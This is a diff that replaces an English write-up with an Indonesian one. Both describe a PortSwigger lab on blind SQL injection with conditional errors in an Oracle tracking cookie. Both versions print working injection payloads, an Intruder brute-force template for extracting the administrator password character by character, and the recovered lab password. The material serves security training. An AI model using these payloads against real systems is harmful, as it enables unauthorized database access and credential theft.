@@ -1,95 +1,82 @@
+# **Blind SQL Injection dengan Conditional Errors** (Bahasa Indonesia)
 
-# Blind SQL injection with conditional errors
+Lab ini memiliki kerentanan blind SQL injection pada cookie pelacakan. Aplikasi tidak mengembalikan hasil query, tetapi memberikan pesan kesalahan khusus jika query SQL menghasilkan error. Anda dapat mengeksploitasi celah ini untuk menemukan password pengguna administrator dan login sebagai admin.
 
-This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+---
 
-The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.
+### **Langkah-Langkah Eksploitasi**
 
-The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
-
-To solve the lab, log in as the administrator user.
-
-Hint: This lab uses an Oracle database. For more information, see the SQL injection cheat sheet.
-
----------------------------------------------
-
-References: 
-
-- https://portswigger.net/web-security/sql-injection/blind
-
-- https://portswigger.net/web-security/sql-injection/cheat-sheet
-
----------------------------------------------
-
-There is a SQL injection in the cookie. First we find we do not get errors with the payload:
-
-```
-COOKIE'+and'1'='1
-```
-
-```
+#### **1. Uji Kerentanan**
+Masukkan payload berikut ke header cookie:
+```plaintext
 Cookie: TrackingId=9HCLCYU9VeK78knn'+and'1'='1
 ```
+Jika query berhasil (tidak error), aplikasi akan tetap merespon seperti biasa.
 
-
-
-![img](images/Blind%20SQL%20injection%20with%20conditional%20errors/1.png)
-
-In MySQL it would be:
-
+#### **2. Trigger Error untuk Validasi**
+Gunakan payload berikut untuk memaksa error:
+```sql
+Cookie: TrackingId=9HCLCYU9VeK78knn'+AND+(SELECT+CASE+WHEN+(1=1)+THEN+TO_CHAR(1/0)+ELSE+'a'+END+FROM+dual)='a
 ```
-COOKIE' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
-COOKIE' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
-```
+- **1=1** menghasilkan error **500**.
+- **1=2** menghasilkan status normal **200**.
 
-But it is Oracle so we must use:
+Payload Oracle menggunakan fungsi `TO_CHAR(1/0)` untuk memaksa pembagian dengan nol (error).
 
-```
-COOKIE' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
-COOKIE' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
-```
+---
 
-```
-9HCLCYU9VeK78knn'+AND+(SELECT+CASE+WHEN+(1=1)+THEN+TO_CHAR(1/0)+ELSE+'a'+END+FROM+dual)='a;
-9HCLCYU9VeK78knn'+AND+(SELECT+CASE+WHEN+(1=2)+THEN+TO_CHAR(1/0)+ELSE+'a'+END+FROM+dual)='a;
+#### **3. Cari Password Admin dengan Brute Force**
+Gunakan fungsi Oracle seperti `SUBSTR` untuk mengambil karakter password:
+```sql
+Cookie: TrackingId=9HCLCYU9VeK78knn'+AND+(SELECT+CASE+WHEN+((SUBSTR((SELECT+password+FROM+users+WHERE+username+=+'administrator'),1,1))='a')+THEN+TO_CHAR(1/0)+ELSE+'a'+END+FROM+dual)='a;
 ```
 
-With 1=1 we get a 500 error code:
+**Penjelasan Query:**
+- `SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)`:
+  - Mengambil karakter pertama password admin.
+- `CASE WHEN ... THEN TO_CHAR(1/0)`:
+  - Jika karakter cocok (misalnya 'a'), query menghasilkan error.
+  - Jika tidak cocok, query berjalan normal.
 
+---
 
+#### **4. Automasi dengan Intruder dan Cluster Bomb**
+1. **Gunakan Burp Suite Intruder**:
+   - Kirim permintaan ke Intruder.
+   - Pilih lokasi karakter password dengan marker (`§`).
+   - Contoh:
+     ```
+     Cookie: TrackingId=4if4HB4swUlejCm0'+AND+(SELECT+CASE+WHEN+((SUBSTR((SELECT+password+FROM+users+WHERE+username+=+'administrator'),§1§,1))='§a§')+THEN+TO_CHAR(1/0)+ELSE+'a'+END+FROM+dual)='a;
+     ```
+2. **Konfigurasi Cluster Bomb**:
+   - Parameter 1: Posisi karakter (1, 2, 3, ...).
+   - Parameter 2: Kemungkinan nilai (a-z, 0-9).
 
-![img](images/Blind%20SQL%20injection%20with%20conditional%20errors/2.png)
+3. **Analisis Respon**:
+   - **500 Internal Server Error** menandakan karakter cocok.
+   - Lanjutkan hingga seluruh password ditemukan.
 
-With 1=2 we get a 200 code:
+---
 
+### **Contoh Hasil**
+1. **Karakter Pertama**: Respon menunjukkan karakter pertama adalah `0`.
+2. **Lanjutkan** hingga menemukan seluruh password, misalnya: `01k6j5tbrjpd9lpdk4zs`.
 
+---
 
-![img](images/Blind%20SQL%20injection%20with%20conditional%20errors/3.png)
+### **Referensi**
+- [Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind)
+- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 
-For the first letter of the administrator user's password we will user (using SUBSTR because it is Oracle):
+---
 
-```
-COOKIE' AND (SELECT CASE WHEN ((SUBSTR((SELECT password FROM users WHERE username = 'administrator'),1,1))='a') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
-```
+### **Ilustrasi**
 
-```
-9HCLCYU9VeK78knn'+AND+(SELECT+CASE+WHEN+((SUBSTR((SELECT+password+FROM+users+WHERE+username+=+'administrator'),1,1))='a')+THEN+TO_CHAR(1/0)+ELSE+'a'+END+FROM+dual)='a;
-```
+#### **Langkah Uji Kerentanan**
+- **1=1**: Menghasilkan error **500**.
+- **1=2**: Respon normal **200**.
 
-
-
-![img](images/Blind%20SQL%20injection%20with%20conditional%20errors/4.png)
-
-We send this to the Intruder and test all letters and numbers until one generates a 500 error code:
-
-
-
-![img](images/Blind%20SQL%20injection%20with%20conditional%20errors/5.png)
-
-We get the first letter is "0":
-
-
-
-![img](images/Blind%20SQL%20injection%20with%20conditional%20errors/6.png)
-
-If we continue we get the password 01k6j5tbrjpd9lpdk4zs
+#### **Brute Force Password**
+- Hasil:
+  - Karakter pertama: `0`.
+  - Password lengkap: `01k6j5tbrjpd9lpdk4zs`.
